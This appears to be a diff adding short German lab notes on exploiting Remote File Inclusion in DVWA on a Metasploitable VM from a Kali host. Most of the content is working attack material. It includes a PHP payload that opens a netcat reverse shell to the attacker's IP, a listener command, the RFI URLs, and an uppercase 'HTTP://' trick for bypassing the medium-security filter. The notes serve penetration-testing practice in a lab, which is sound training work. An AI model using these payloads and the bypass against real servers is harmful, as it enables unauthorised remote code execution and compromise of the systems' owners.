@@ -1,0 +1,55 @@
+Remote File Inclusion
+
+######################
+#   metasploitable   #
+######################
+
+sudo -i
+
+nano /etc/php5/cgi/php.ini
+
+
+allow_url_fopen = On
+und
+allow_url_include = On
+
+auf on setzen
+
+Apache restart
+/etc/init.d/apache2 restart
+
+####################
+#   Auf dem Kali   #
+####################
+
+touch myrat.txt
+  
+echo "<?php shell_exec('nc -e /bin/sh 10.10.10.109 443');?>" > myrat.txt
+
+<?php
+shell_exec('nc -e /bin/sh 10.10.10.109 443');
+?>
+
+cp myrat.txt /var/www/html/
+
+service apache2 restart
+
+nc -vv -l -p 443
+
+##########
+#  DVWA  #
+##########
+
+Security auf Low
+
+File Inclusion 
+
+http://10.10.10.103/dvwa/vulnerabilities/fi/?page=http://10.10.10.109/myrat.txt
+
+für Security Medium
+kein http:// und https:// möglich deshalb gross schreiben
+
+HTTP://10.10.10.103/dvwa/vulnerabilities/fi/?page=http://10.10.10.109/myrat.txt
+
+10.10.10.103 ist metasploitable
+10.10.10.109 ist Kali
